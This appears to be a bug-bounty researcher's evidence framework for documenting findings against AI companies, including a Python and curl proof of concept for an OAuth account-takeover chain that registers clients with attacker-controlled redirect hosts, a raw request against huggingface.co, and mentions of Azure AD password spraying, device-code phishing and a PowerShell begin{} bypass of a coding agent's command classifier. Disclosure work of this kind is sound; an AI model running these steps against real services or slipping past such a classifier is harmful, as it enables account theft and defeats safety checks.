# Evidence Framework — No Mercy Hunter v3.0

Derived from real evidence collected for 18 findings across OpenAI, HuggingFace, Anthropic, Mistral.

---

## Evidence Standards by Severity

### P1 — Critical (HF-01 OAuth ATO, F-10 ROPC Chain)

Required evidence package:
1. Full HTTP request/response for EACH step in the attack chain
2. Screenshot showing final impact (account accessed, data read)
3. Runnable PoC script (curl commands or Python) that reproduces end-to-end
4. Timeline document showing each discovery step
5. Video recording of full PoC execution (strongly recommended for P1)
6. Impact statement: which users affected, what data exposed, what attacker can do

Example — HF-01 OAuth ATO evidence package:
  evidence/HF-01/http/01-register-client.http     (unauthenticated POST to /oauth/register)
  evidence/HF-01/http/02-auth-url-accepted.http   (authorization URL accepted evil.com)
  evidence/HF-01/http/03-code-received.http       (code delivered to evil.com callback)
  evidence/HF-01/http/04-token-exchange.http      (code redeemed for access token)
  evidence/HF-01/http/05-account-access.http      (victim account accessed with stolen token)
  evidence/HF-01/screenshots/01-register-200.png
  evidence/HF-01/screenshots/02-auth-url.png
  evidence/HF-01/screenshots/03-account-accessed.png
  evidence/HF-01/poc/hf-01-oauth-ato.py           (runnable PoC)
  evidence/HF-01/timeline.md
  evidence/HF-01/video/hf-01-demo.mp4

### P2 — High (CODEX-01/02/03/04, F-08)

Required evidence package:
1. Full HTTP request/response for the bypass
2. Screenshot showing classifier/auth bypassed
3. Runnable PoC (curl or script)
4. Before/after comparison: blocked payload vs. bypassed payload
5. Impact statement

Example — CODEX-01 PowerShell begin{} evidence:
  evidence/CODEX-01/http/01-blocked-command.http    (classifier blocks direct command)
  evidence/CODEX-01/http/02-begin-block-bypass.http (begin{} block accepted)
  evidence/CODEX-01/screenshots/01-blocked.png
  evidence/CODEX-01/screenshots/02-bypassed.png
  evidence/CODEX-01/poc/codex-01-begin-block.ps1
  evidence/CODEX-01/impact.md

### P3 — Medium (F-01, F-02, F-05, HF-02, MI-01)

Required evidence package:
1. Full HTTP request/response showing the vulnerability
2. Screenshot of response body
3. curl command that reproduces the finding
4. Impact explanation

### P4 — Low/Informational (F-03, F-04, F-06, F-07, AN-01)

Minimum evidence package:
1. Full HTTP request/response
2. Screenshot
3. curl command to reproduce

---

## HTTP Request/Response Capture Procedure

### Using Playwright (preferred — captures authenticated sessions)

```javascript
// playwright-capture.js
const { chromium } = require('playwright');
const fs = require('fs');

(async () => {
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext({
    recordHar: { path: 'evidence/session.har' }  // captures all HTTP
  });
  const page = await context.newPage();

  // Navigate and authenticate
  await page.goto('https://target.com');
  // ... login steps ...

  // Intercept specific requests
  context.on('request', request => {
    if (request.url().includes('/api/')) {
      fs.appendFileSync('evidence/api-requests.txt',
        `${request.method()} ${request.url()}\n${JSON.stringify(request.headers())}\n${request.postData() || ''}\n---\n`);
    }
  });
  context.on('response', async response => {
    if (response.url().includes('/api/')) {
      const body = await response.text().catch(() => '');
      fs.appendFileSync('evidence/api-responses.txt',
        `${response.status()} ${response.url()}\n${JSON.stringify(response.headers())}\n${body}\n---\n`);
    }
  });

  // Perform exploit steps here
  // ...

  await context.close();
  await browser.close();
})();
```

### Using curl (for unauthenticated or simple requests)

Always use -v flag to capture full headers:
```
curl -v -s -X POST "https://target.com/oauth/register" \
  -H "Content-Type: application/json" \
  -d '{"client_name":"test","redirect_uris":["https://evil.com/callback"],"grant_types":["authorization_code"]}' \
  2>&1 | tee evidence/FINDING-ID/http/01-request.http
```

### Raw HTTP format (for report submission)

Format every HTTP capture as plain text:
```
POST /oauth/register HTTP/1.1
Host: huggingface.co
Content-Type: application/json
User-Agent: Mozilla/5.0
Content-Length: 123

{"client_name":"test-attacker","redirect_uris":["https://evil.attacker.com/callback"],"grant_types":["authorization_code"],"response_types":["code"]}

--- RESPONSE ---

HTTP/1.1 201 Created
Content-Type: application/json
Date: Sat, 21 Jun 2026 12:00:00 GMT

{"client_id":"abc123","client_secret":"xyz789","redirect_uris":["https://evil.attacker.com/callback"]}
```

---

## Screenshot Protocol

### What to capture

1. URL bar visible with full URL
2. Response status code visible (browser DevTools Network tab or curl output)
3. Relevant section of response body highlighted or annotated
4. For multi-step chains: one screenshot per step

### Naming convention

Format: {FINDING-ID}-{STEP_NUMBER}-{DESCRIPTION}.png

Examples:
  HF-01-01-unauth-register-200.png
  HF-01-02-evil-redirect-accepted.png
  HF-01-03-victim-account-accessed.png
  CODEX-01-01-direct-command-blocked.png
  CODEX-01-02-begin-block-bypassed.png
  F-08-01-tenant-id-extracted.png
  F-10-01-ropc-enabled.png
  F-10-02-user-enumeration.png

### Storage path

evidence/{FINDING-ID}/screenshots/{filename}.png

### Redaction requirements

Before including screenshots in reports:
- Redact other users' email addresses, names, or IDs
- Redact internal API keys not part of the PoC
- Redact personal information not needed to demonstrate impact
- Keep: your test account data, the vulnerability demonstration, URLs, response codes

---

## PoC Code Standards

### Naming convention

{FINDING-ID}-poc.{extension}

Examples:
  HF-01-poc.py         (OAuth ATO chain)
  CODEX-01-poc.ps1     (PowerShell begin block)
  F-10-poc.py          (Azure AD ROPC spray)
  F-08-poc.sh          (Azure AD tenant recon)

### Requirements for valid PoC

1. Self-contained: runs with minimal setup (install requirements.txt, set one env var)
2. Commented: each step explains what it does and why it demonstrates the vulnerability
3. Non-destructive: does not delete data, does not affect other users, does not cause DoS
4. Reproducible: runs the same way every time
5. Outputs clear confirmation: prints "VULNERABILITY CONFIRMED" or similar when successful

### PoC template (Python)

```python
#!/usr/bin/env python3
"""
PoC: FINDING-ID — Vulnerability Title
Target: https://target.com
Severity: P1/P2/P3/P4
Researcher: your-handle
Date: YYYY-MM-DD

Usage:
  pip install requests
  export TARGET_TOKEN="your_account_b_token_here"
  python3 HF-01-poc.py

Expected output:
  [+] VULNERABILITY CONFIRMED: cross-account OAuth client registration
"""

import requests
import os
import sys

TARGET = "https://target.com"
TOKEN  = os.environ.get("TARGET_TOKEN", "")

def step1_register_oauth_client():
    """
    Step 1: Register OAuth client without authentication.
    Demonstrates: /oauth/register endpoint accepts registration with no auth header.
    """
    print("[*] Step 1: Attempting unauthenticated OAuth client registration...")
    r = requests.post(f"{TARGET}/oauth/register",
        json={
            "client_name": "poc-test-delete-me",
            "redirect_uris": ["https://attacker-poc.example.com/callback"],
            "grant_types": ["authorization_code"],
            "response_types": ["code"]
        })
    if r.status_code == 201:
        data = r.json()
        print(f"[+] Registration succeeded: client_id={data['client_id']}")
        return data
    else:
        print(f"[-] Registration failed: {r.status_code} {r.text}")
        sys.exit(1)

def step2_confirm_evil_redirect(client_id):
    """
    Step 2: Confirm evil.com redirect_uri is accepted in authorization URL.
    """
    print("[*] Step 2: Checking authorization URL with evil.com redirect_uri...")
    auth_url = (f"{TARGET}/oauth/authorize"
                f"?client_id={client_id}"
                f"&redirect_uri=https://attacker-poc.example.com/callback"
                f"&response_type=code&scope=openid+profile+email&state=poc123")
    r = requests.get(auth_url, allow_redirects=False)
    if r.status_code in (200, 302):
        print(f"[+] Authorization URL accepted: {auth_url}")
        print(f"[+] VULNERABILITY CONFIRMED: unauthenticated OAuth ATO chain possible")
    else:
        print(f"[-] Authorization URL rejected: {r.status_code}")

if __name__ == "__main__":
    client = step1_register_oauth_client()
    step2_confirm_evil_redirect(client["client_id"])
```

---

## Chain-of-Custody for Multi-Step Findings

For P1 chains (F-08+F-10, HF-01), maintain strict chain-of-custody:

### Directory structure

```
evidence/
  FINDING-ID/
    http/
      01-first-step.http
      02-second-step.http
      03-third-step.http
      04-impact-confirmation.http
    screenshots/
      01-first-step.png
      02-second-step.png
      03-impact.png
    poc/
      FINDING-ID-poc.py
      FINDING-ID-poc.sh
    timeline.md
    impact.md
    video/
      FINDING-ID-demo.mp4  (optional but recommended for P1)
```

### timeline.md format

```markdown
# Finding Timeline — FINDING-ID

| Timestamp | Event |
|-----------|-------|
| 2026-06-21 10:00 UTC | Passive recon started on target.com |
| 2026-06-21 10:15 UTC | staging.target.com discovered via crt.sh |
| 2026-06-21 10:20 UTC | Azure AD tenant ID extracted from openid-configuration |
| 2026-06-21 10:25 UTC | ROPC grant type confirmed enabled |
| 2026-06-21 10:30 UTC | User enumeration confirmed via AADSTS error codes |
| 2026-06-21 10:35 UTC | Device code phishing URL generated |
| 2026-06-21 10:40 UTC | PoC completed, chain fully demonstrated |
| 2026-06-21 11:00 UTC | Report drafted |
| 2026-06-21 11:30 UTC | Report submitted to Bugcrowd |
```

---

## SQLite Findings Database

### Schema (from bug_bounty.db — already initialized)

```sql
-- Targets table
CREATE TABLE targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    domain TEXT NOT NULL,
    program TEXT,           -- bugcrowd, hackerone, direct
    scope TEXT,             -- json array of in-scope domains
    notes TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Subdomains table
CREATE TABLE subdomains (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER REFERENCES targets(id),
    subdomain TEXT NOT NULL,
    ip TEXT,
    status_code INTEGER,
    title TEXT,
    tech_stack TEXT,        -- json array from httpx
    is_live BOOLEAN DEFAULT 0,
    found_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Endpoints table
CREATE TABLE endpoints (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER REFERENCES targets(id),
    url TEXT NOT NULL,
    method TEXT DEFAULT 'GET',
    status_code INTEGER,
    auth_required BOOLEAN,
    notes TEXT,
    found_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Findings table
CREATE TABLE findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER REFERENCES targets(id),
    finding_id TEXT,        -- e.g. F-08, HF-01, CODEX-01
    title TEXT NOT NULL,
    severity TEXT,          -- P1, P2, P3, P4
    cvss_score REAL,
    cvss_vector TEXT,
    cwe TEXT,
    endpoint TEXT,
    description TEXT,
    impact TEXT,
    status TEXT DEFAULT 'draft',  -- draft, submitted, triaging, accepted, duplicate, na
    platform TEXT,          -- bugcrowd, hackerone, direct
    report_id TEXT,         -- platform report ID after submission
    bounty REAL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    submitted_at DATETIME,
    resolved_at DATETIME
);

-- Notes table
CREATE TABLE notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER REFERENCES targets(id),
    finding_id INTEGER REFERENCES findings(id),
    content TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Scans table
CREATE TABLE scans (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER REFERENCES targets(id),
    scan_type TEXT,         -- passive_recon, auth_surface, ai_specific, infra_sweep
    status TEXT DEFAULT 'running',
    output_path TEXT,
    started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    completed_at DATETIME
);

-- Summary view
CREATE VIEW findings_summary AS
SELECT
    f.finding_id,
    t.domain,
    f.title,
    f.severity,
    f.cvss_score,
    f.status,
    f.platform,
    f.report_id,
    f.bounty,
    f.created_at,
    f.submitted_at
FROM findings f
JOIN targets t ON f.target_id = t.id
ORDER BY
    CASE f.severity WHEN 'P1' THEN 1 WHEN 'P2' THEN 2 WHEN 'P3' THEN 3 WHEN 'P4' THEN 4 END,
    f.created_at DESC;
```

### Common queries

```bash
# View all findings
sqlite3 bug_bounty.db "SELECT * FROM findings_summary;"

# Log a new finding
sqlite3 bug_bounty.db "INSERT INTO findings
  (target_id, finding_id, title, severity, cvss_score, endpoint, status)
  VALUES (1, 'F-11', 'New Finding Title', 'P2', 7.5, '/api/v1/endpoint', 'draft');"

# Update finding status after submission
sqlite3 bug_bounty.db "UPDATE findings SET status='submitted', submitted_at=datetime('now'),
  report_id='BC-123456' WHERE finding_id='F-11';"

# Count by severity
sqlite3 bug_bounty.db "SELECT severity, COUNT(*) FROM findings GROUP BY severity ORDER BY severity;"

# Find all accepted findings with bounty
sqlite3 bug_bounty.db "SELECT finding_id, title, bounty FROM findings WHERE status='accepted' ORDER BY bounty DESC;"
```
